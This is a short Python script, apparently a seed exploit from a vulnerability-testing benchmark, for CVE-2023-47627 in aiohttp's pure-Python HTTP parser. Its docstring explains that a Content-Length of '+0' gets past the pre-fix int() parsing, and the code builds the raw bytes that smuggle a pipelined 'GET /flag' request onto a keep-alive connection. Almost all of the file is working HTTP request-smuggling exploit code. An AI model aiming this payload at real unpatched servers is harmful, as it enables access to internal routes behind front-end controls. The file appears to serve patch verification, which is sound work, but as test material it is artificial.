#!/usr/bin/env python3
"""[GIVEN] CVE-2023-47627 seed exploit for aiohttp's pure-Python parser.

An obfuscated Content-Length that the PRE-fix parser accepts via `int(length_hdr)`
(the int constructor tolerates a leading `+`/`-` and digit-separating underscores).
Because the value evaluates to 0, the first request is framed with an empty body and
the pipelined `GET /flag` is parsed as the next request on the keep-alive connection
-> the smuggled request reaches the internal ${PCB_FLAG} route.

  V0 aiohttp 3.8.5: int("+0") == 0            -> accepted  -> FLAG (seed reaches).
  V1 aiohttp 3.8.6: "+0".isdecimal() == False -> 400+close -> BLOCKED (seed closed).

`build_smuggle(cl_value_bytes)` is the shared framing helper; the residual reuses it
with a Unicode-digit Content-Length value.
"""


def build_smuggle(cl_value: bytes) -> bytes:
    """Front request with an obfuscated Content-Length (value must evaluate to 0),
    then a pipelined `GET /flag` smuggled request (Connection: close so the reader
    terminates once the canary response is sent)."""
    return (
        b"POST / HTTP/1.1\r\n"
        b"Host: t\r\n"
        b"Content-Length: " + cl_value + b"\r\n"
        b"\r\n"
        b"GET /flag HTTP/1.1\r\n"
        b"Host: t\r\n"
        b"Connection: close\r\n"
        b"\r\n"
    )


def candidate() -> dict:
    # CVE-2023-47627: leading '+' is swallowed by int() but rejected by .isdecimal().
    return {"id": "cve-2023-47627-cl-plus", "raw": build_smuggle(b"+0")}


import json

if __name__ == "__main__":
    print(json.dumps(candidate(), indent=2))
